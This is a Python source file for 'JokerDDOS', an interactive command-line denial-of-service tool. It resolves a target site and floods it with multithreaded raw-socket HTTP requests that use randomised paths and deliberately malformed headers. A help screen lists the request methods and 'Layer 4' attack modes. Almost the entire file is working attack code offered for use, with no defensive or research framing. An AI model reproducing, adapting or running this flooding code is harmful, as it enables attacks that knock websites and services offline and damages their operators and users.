# Import Librarry
from string import (ascii_letters,digits,punctuation)
from random import sample,choice
from time import time
from requests import get
from os import system as sy
from sys import stdout
import socket
from threading import Thread
#Colors
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn, k,g = '\033[00;36m', '\033[90m','\033[38;5;130m'
#Start Funcs
def clearscreen():
    if "Windows" in __import__("platform").uname():
        try:from colorama import init
        except:sy("pip install colorama")
        sy('cls')
    else:
        sy('clear')
clearscreen()

def generatePath(num):
    msg = str(ascii_letters + digits + punctuation)
    data = "".join(sample(msg, int(num)))
    return data
   
def generatePathCh(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += choice(letter)
    return data

def DdosAttack(ip,host,port,type_attack,booter_sent,data_type_loader_packet):
    url_path = ''
    path_get = ['PY_DDOS','CHOICES_DDOS']
    path_get_loader = choice((path_get))
    if path_get_loader == "PY_DDOS":
        url_path = generatePath(5)
    else:
        url_path = generatePathCh(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':DataPacket = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        elif data_type_loader_packet == 'OWN1':DataPacket = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
        elif data_type_loader_packet == 'OWN2':DataPacket = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
        elif data_type_loader_packet == 'OWN3':DataPacket = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
        elif data_type_loader_packet == 'OWN4':DataPacket = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
        elif data_type_loader_packet == 'OWN5':DataPacket = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
        elif data_type_loader_packet == 'OWN6':DataPacket = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n".encode()
        elif data_type_loader_packet == 'OWN7':DataPacket = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r".encode()
        elif data_type_loader_packet == 'OWN8':DataPacket = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r".encode()
        elif data_type_loader_packet == 'TEST':DataPacket = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST2':DataPacket = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\n\r\r\n\r\n\n\n".encode()
        elif data_type_loader_packet == 'TEST3':DataPacket = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST4':DataPacket = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\a\n\n\r\r".encode()
        elif data_type_loader_packet == 'TEST5':DataPacket = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\t\n\n\r\r".encode()
        s.connect((ip,port))
        for _ in range(booter_sent):
            s.sendall(DataPacket)
            s.send(DataPacket)
    except:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass

status_code = False
def StartAttack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
    global status_code
    if status_code == True:
        while time() < time_loader:
            for _ in range(spam_loader):
                th = Thread(target=DdosAttack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = Thread(target=DdosAttack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = Thread(target=DdosAttack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = Thread(target=DdosAttack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = Thread(target=DdosAttack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
    else:
        Thread(target=StartAttack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
one = "/"
status_help_type = 0
numch = 0
def JokerDDOS():
    global status_help_type,status_code,one,username,password,numch
    if status_help_type == 0:
        print(f"""{k}

➖➖⬛⬛⬛
➖⬛⬛⬜⬜⬛
⬛⬛⬜⬜⬜⬜
⬛⬜🔲⬛⬜🔲⬛
⬛⬜⬜⬜🔳⬜⬜
➖⬛⬛⬛⬛⬛⬛
➖⬛⬛🔲🔲🔲
➖⬛⬛⬛⬛⬛⬛
⬜⬜⬜⬛⬛⬛⬛
⬜⬜⬜⬜⬜⬜

           {lrd} - {gn} /Help         
""")
        status_help_type += 1
    else:
        pass

    Terminal = input(f"{lgn}: > ")
    args_get = Terminal.split(" ")
    if args_get[0].upper() == f"{one}HELP":
        print(f"""{k}
 
 ⬜⬜⬜⬛⬛⬛⬛⬛⬜⬜⬜
⬜⬜⬛⬜⬜⬜⬜⬜⬛⬜⬜
⬜⬛⬜⬜⬜⬜⬜⬜⬜⬛⬜
⬛⬜⬜⬛⬛⬜⬛⬛⬜⬜⬛
⬛⬜⬛⬛⬛⬜⬛⬛⬛⬜⬛
⬛⬜⬛⬛⬛⬜⬛⬛⬛⬜⬛
⬛⬜⬛⬛⬜⬜⬜⬛⬛⬜⬛
⬛⬜⬜⬜⬜⬛⬜⬜⬜⬜⬛
⬜⬛⬜⬜⬜⬜⬜⬜⬜⬛⬜
⬜⬜⬛⬜⬛⬜⬛⬜⬛⬜⬜
⬜⬜⬛⬜⬛⬜⬛⬜⬛⬜⬜
⬜⬜⬜⬛⬛⬛⬛⬛⬜⬜⬜

                                             
{cn}    JokerDDOS {yw}[
    
        {lgn}/clear {lrd}==> {gn}Clear Screen
        {lgn}/Menu {lrd}==> {gn}Back to the main page 
        {lgn}/CH-AT {lrd}==> {gn}For change gui attack
        {lgn}/DDOS {lrd}==> {gn}For attack target with http DDOS
        {lgn}/PING {lrd}==> {gn}For ping test with url
        {lgn}/PING-TCP {lrd}==> {gn}For ping test with tcp
{yw}    ]                  """)
    elif args_get[0].upper() == f"{one}CH-AT":
        if len(args_get) == 2:
            gui_leak = args_get[1].upper()
            if gui_leak == "OLD":
                numch = 0
            elif gui_leak == "TEXT":
                numch = 1
            elif gui_leak == "TEXT2":
                numch = 2
            elif gui_leak == "TEXT3":
                numch = 3
        else:
            print(f"\n{lrd}[{lgn}+{lrd}]{gn} /CH-AT {lrd}<{lgn}MODE{lrd}>\n    {lrd}[{lgn}+{lrd}]{gn} MODE {yw}---> {cn}OLD TEXT TEXT2 TEXT3")
    elif args_get[0].upper() == f"{one}CLEAR":
        clearscreen()
    elif args_get[0].upper() == f"{one}MENU":
        clearscreen()
        print(f"""{lgn}
⬜⬜⬜⬛⬜⬜⬜⬛⬜⬜⬜⬛
⬜⬜⬛🟨⬛⬜⬛🟨⬛⬜⬛🟨
⬜⬜⬛🟨🟨⬛🟨🟨🟨⬛🟨🟨
⬜⬜⬛🟨🟨🟨🟨🟨🟨🟨🟨🟨
⬜⬛🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨
⬜⬛🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨
⬜⬛🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨
⬜⬛⬛⬛🟨⬛⬛⬛⬛🟨🟨🟨
⬛⬜⬜⬜⬛⬜⬜⬜⬜⬛🟨🟨
⬛⬜⬛⬜⬛⬜⬜⬛⬜⬛🟨🟨
⬛⬜⬜⬜⬛⬜⬜⬜⬜⬛🟨🟨
⬛⬜⬛⬛⬛⬜⬜⬜⬜⬛🟨🟨
⬜⬛🟨🟨🟨⬛⬛⬛⬛🟨🟨🟨
⬛🟨⬛⬛🟨🟨🟨🟨🟨🟨🟨⬛
⬛🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨⬛
⬛🟨🟨🟨🟨🟨🟨🟨⬛🟨🟨⬛
⬜⬛⬛⬛⬛⬛⬛⬛🟨🟨🟨⬛
⬜⬜⬜⬜⬛⬛🟨🟨🟨🟨⬛⬜
⬜⬜⬜⬜⬜⬛⬛⬛⬛⬛⬜⬜


""")
    elif args_get[0].upper() == f"{one}EXIT":
        print(f"{lgn} ByeBye")
        try:
            exit()
        except:
            exit()
    elif args_get[0].upper() == f"{one}PING":
        if len(args_get) == 2:
            status_code_leak = ''
            try:
                a = time()
                url = args_get[1]
                req = get(url)
                b = time()
                status_code_leak = "OK"
            except:
                c = time()
                status_code_leak = 'NO'
            if status_code_leak == "OK":
                print(f"\n\n{lrd}[{lgn}+{lrd}]{gn} Status : {rd}{req.status_code}{yw}:{lrd}{req.reason}\n{lrd}[{lgn}+{lrd}]{gn} Requests : {gn}{a} MS \n{lrd}[{lgn}+{lrd}]{gn} Response : {gn}{b} MS\n{lrd}[{lgn}+{lrd}]{gn} Ping : {gn}{a-b} MS")
            else:
                print(f"\n\n{lrd}[{rd}-{lrd}]{gn} Status : {lrd}Internet Error \n{lrd}[{rd}-{lrd}]{gn} Requests : {lrd}{a} MS \n{lrd}[{rd}-{lrd}]{gn} Response : {lrd}NULL MS \n{lrd}[{rd}-{lrd}]{gn} Ping : {lrd}NULL MS")
        else:
            print(f"{lrd}[{lgn}+{lrd}]{gn} /PING {lrd}<{lgn}URL{lrd}>\n")
    elif args_get[0].upper() == f"{one}PING-TCP":
        if len(args_get) == 3:
            status_code_leak = ''
            ip_tar = str(args_get[1])
            port_tar = int(args_get[2])
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            try:
                a = time()
                s.connect((ip_tar,port_tar))
                b = time()
                status_code_leak = "OK"
            except:
                c = time()
                status_code_leak = 'NO'
            s.close()
            if status_code_leak == "OK":
                print(f"\n\n{lrd}[{lgn}+{lrd}]{gn} Status : {lgn}Connect!{lrd}\n{lrd}[{lgn}+{lrd}]{gn} Requests : {gn}{a} MS \n{lrd}[{lgn}+{lrd}]{gn} Response : {gn}{b} MS\n{lrd}[{lgn}+{lrd}]{gn} PING : {gn}{a-b} MS")
            else:
                print(f"\n\n{lrd}[{rd}-{lrd}]{gn} Status : {lrd}Internet Error \n{lrd}[{rd}-{lrd}]{gn}Requests : : {lrd}{a} MS \n{lrd}[{rd}-{lrd}]{gn} Response : {lrd}NULL MS \n{lrd}[{rd}-{lrd}]{gn}Ping : {lrd}NULL MS")
        else:
            print(f"\n{lrd}[{lgn}+{lrd}]{gn}/PING-TCP {lrd}<{lgn}IP{lrd}> {lrd}<{lgn}PORT{lrd}>")
    elif args_get[0].upper() == f"{one}DDOS":
        if len(args_get) == 10:
            data_type_loader_packet = args_get[1].upper()
            target_loader = args_get[2]
            port_loader = int(args_get[3])
            time_loader = time() + int(args_get[4])
            spam_loader = int(args_get[5])
            create_thread = int(args_get[6])
            booter_sent = int(args_get[7])
            methods_loader = args_get[8]
            spam_create_thread = int(args_get[9])
            code_leak = True
            host = ''
            ip = ''
            try:
                host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                ip = socket.gethostbyname(host)
                code_leak = True
            except socket.gaierror:
                code_leak = False
                print(f"{lrd}[{rd}-{lrd}]{rd} FAILED TO GET URL . . .")
            if code_leak == True:
             for loader_num in range(create_thread):
                stdout.write(f"\r {lrd}[{lgn}+{lrd}]{gn} {loader_num},{cn}{create_thread} {lgn}Started Attack...")
                stdout.flush()
                for _ in range(spam_create_thread):
                  Thread(target=StartAttack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
             status_code = True
             if numch == 0:
                clearscreen()
                print(f""" {k}
 ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
 ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
 ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
 ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
 ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
 ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
 ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁

                                                  
      {lrd}[{lgn}+{lrd}]{gn} Target : {lgn}{target_loader}\n       {lrd}[{lgn}+{lrd}]{gn} Port : {lgn}{port_loader}\n       {lrd}[{lgn}+{lrd}]{gn} Type : {lgn}{data_type_loader_packet}\n\n    {lrd}Packets sent successfully \n\nChannel : @Lone_fighter""")
             elif numch == 3:
                clearscreen()
                print(f""" {k}
⁣⣿⣿⡿⠋⠄⡀⣿⣿⣿⣿⣿⣿⣿⠿⠛⠋⣉⣉⣉⡉⠙⠻
⣿⣿⣇⠔⠈⣿⣿⣿⣿⡿⠛⢉⣤⣶⣾⣿⣿⣿⣿⣿⣿⣦
⣿⠃⠄⢠⣾⣿⣿⠟⢁⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠟⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠋⢠⣾⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿
⡿⠁⣰⣿⣿⣿⣿⣿⣿⣿⣿⠗⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿
⠁⣼⣿⣿⣿⣿⣿⣿⡿⠋⠄⠄⠄⣠⣄⢰⣿⣿⣿⣿⣿⣿
⣼⣿⣿⣿⣿⣿⣿⡇⠄⢀⡴⠚⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢰⣿⣿⣿⣿⣿⡿⣿⣿⠴⠋⠄⠄⢸⣿⣿⣿⣿⣿⣿⣿⡟
⣿⣿⣿⣿⣿⣿⠃⠈⠁⠄⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⡟⢀
⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⢶⣿⣿⣿⣿⣿⣿⣿⣿⠏⢀⣾
⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⠋⣠⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⣼⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⣴⣿⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⢁⣴⣿⣿⣿⠗⠄⠄⣿
⠈⠻⣿⣿⣿⣿⣿⣿⠿⠛⣉⣤⣾⣿⣿⣿⣿⣇⠠⠺⣷⣿
⣦⣄⣈⣉⣉⣉⣡⣤⣶⣿⣿⣿⣿⣿⣿⣿⠉⠁⣀⣼⣿⣿

                                                  
      {lrd}[{lgn}+{lrd}]{gn} Target : {lgn}{target_loader}\n       {lrd}[{lgn}+{lrd}]{gn} Port : {lgn}{port_loader}\n       {lrd}[{lgn}+{lrd}]{gn} Type : {lgn}{data_type_loader_packet}\n       {lrd}[{lgn}+{lrd}]{gn} Time : {lgn}{time_loader}\n\n""")
             elif numch == 1:
                 print(f"\n{lrd}[{lgn}+{lrd}]{gn} SOCKET Send {lrd}<{lgn}{data_type_loader_packet}{lrd}> {gn}to {lrd}<{lgn}{ip}:{port_loader}{lrd}>")
             elif numch == 2:
                 print(f"\n{lrd}[{lgn}+{lrd}]{gn} Send attack to {lgn}{ip}:{port_loader}")
        else:
            print(f"""\n\n{lrd}[{lgn}+{lrd}]{gn} Type Packet{yw} --> {lrd}<{lgn}PYF {lrd}/{lgn} TEST/TEST5 {lrd}/{lgn} OWN1/OWN7{lrd}>\n {lrd}[{lgn}+{lrd}]{gn} TIME{cn} [Ex 200]\n  {lrd}[{lgn}+{lrd}]{gn} Thread {cn}[Ex=300]\n    {lrd}[{lgn}+{lrd}]{gn} Create Thread{cn} [Ex=30]\n      {lrd}[{lgn}+{lrd}]{gn} Spam {cn} [100]\n\n    {lgn}Methods Layer 7 {yw}[          {lgn}Methods Layer 4/hc{yw}[ 

            {lrd}|{gn}CONNECT {lrd}|            {lrd}|{cn}PANOS {lrd}|
            {lrd}|{gn}GET {lrd}|                {lrd}|{cn}MIRAI {lrd}|
            {lrd}|{gn}PUT {lrd}|                {lrd}|{cn}EXPLOIT {lrd}|
            {lrd}|{gn}PATCH {lrd}|              {lrd}|{cn}LOGSHELL {lrd}|
            {lrd}|{gn}POST {lrd}|               {lrd}|{cn}SERVER {lrd}|
            {lrd}|{gn}HEAD {lrd}|               {lrd}|{cn}CLOUDFLARE {lrd}|
            {lrd}|{gn}DELETE {lrd}|             {lrd}|{cn}PYDDOSER {lrd}|
            {lrd}|{gn}OPTIONS {lrd}|            {lrd}|{cn}GATEWAY {lrd}|
            {lrd}|{gn}TRACE {lrd}|                   {yw}]
    {yw}]                                                   """)
            print(f"\n\n{lrd}[{lgn}+{lrd}]{gn} Ex : {yw}{one}DDOS {lrd}<{lgn}Type packet{lrd}> {lrd}<{lgn}Url{lrd}> {lrd}<{lgn}Port{lrd}>{lrd} <{lgn}Time{lrd}> {lrd}<{lgn}Spam Thread{lrd}> {lrd}<{lgn}Create Thread{lrd}> {lrd}<{lgn}Booter Sent{lrd}> {lrd}<{lgn}Method{lrd}> {lrd}<{lgn}Spam Create{lrd}>")
    else:
        print(f"{lrd}[{lrd}\"{Terminal}\"{lrd}]{rd} Not found JokerDDOS")
    JokerDDOS()

JokerDDOS()